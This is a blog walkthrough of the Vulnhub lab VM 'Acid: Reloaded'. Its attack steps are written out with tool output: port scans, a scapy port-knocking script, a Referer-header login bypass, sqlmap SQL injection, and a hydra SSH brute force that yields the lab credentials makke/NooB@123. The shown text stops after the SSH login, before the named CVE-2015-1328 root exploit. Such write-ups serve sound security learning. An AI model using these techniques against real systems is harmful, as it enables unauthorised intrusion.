
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>[Vulnhub]acid_reloaded  | F4l13n5n0w</title>

<meta name="author" content="F4l13n5n0w"> 

<meta name="description" content="This is a description"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
<h4>Info Security & Pen Testing learning notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="https://github.com/F4l13n5n0w">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="https://github.com/F4l13n5n0w">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">[Vulnhub]acid_reloaded</h2>
	<div class="entry-content"><p><strong>Acid: Reloaded</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Ports knocking to active hidden ports</li>
<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Write python script to make port knocking to active filtered ports</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden web login page and bypass it</li>
<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.139    00:0c:29:bb:6e:b3   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e3:03:1b   VMware, Inc.
</span><span class='line'>
</span><span class='line'>4 packets received by filter, 0 packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.139 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Then I connect to target via SSH to grab banner.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>root@10.1.1.139's password:</span></code></pre></td></tr></table></div></figure>


<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>

<figure class='code'><figcaption><span>knock.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;10.1.1.139&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s">&quot;S&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;[+]knocking port &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+]Done!&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use unicornscan to check again, found another port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64 
</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-11 07:26 EDT
</span><span class='line'>NSE: Loaded 33 scripts for scanning.
</span><span class='line'>Initiating ARP Ping Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [2 ports]
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
</span><span class='line'>Initiating Service scan at 07:26
</span><span class='line'>Scanning 2 services on 10.1.1.139
</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
</span><span class='line'>NSE: Script scanning 10.1.1.139.
</span><span class='line'>Initiating NSE at 07:26
</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
</span><span class='line'>Nmap scan report for 10.1.1.139
</span><span class='line'>Host is up (0.00050s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure>


<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host http://10.1.1.139:3344/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ No web server found on 10.1.1.139:3344
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 0 host(s) tested
</span><span class='line'>root@kali:~# nikto -host http://10.1.1.139:33447/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.139
</span><span class='line'>+ Target Hostname:    10.1.1.139
</span><span class='line'>+ Target Port:        33447
</span><span class='line'>+ Start Time:         2015-09-11 07:31:36 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.10 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ IP address found in the 'location' header. The IP is "127.0.1.1".
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1:33447/images/".
</span><span class='line'>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 8330 requests: 0 error(s) and 11 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)
</span><span class='line'>---------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>

<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>

<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>

<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>available databases [4]:                                                                                                                                                           
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] performance_schema
</span><span class='line'>[*] secure_login
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>Database: secure_login                                                                                                                                                             
</span><span class='line'>[4 tables]
</span><span class='line'>+-----------------+
</span><span class='line'>| UB3R/strcpy.exe |
</span><span class='line'>| login_attempts  |
</span><span class='line'>| members         |
</span><span class='line'>| word            |
</span><span class='line'>+-----------------+
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>

<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>

<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt 
</span><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>acid.exploit@gmail.com
</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure>


<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-09-11 08:49:26
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure>


<p>Login to the SSH with makke&rsquo;s login</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh makke@10.1.1.139 
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>makke@10.1.1.139's password: 
</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>134 packages can be updated.
</span><span class='line'>80 updates are security updates.
</span><span class='line'>
</span><span class='line'>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
</span><span class='line'>makke@acid:~$ id
</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
</span><span class='line'>makke@acid:~$ ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3  
</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000 
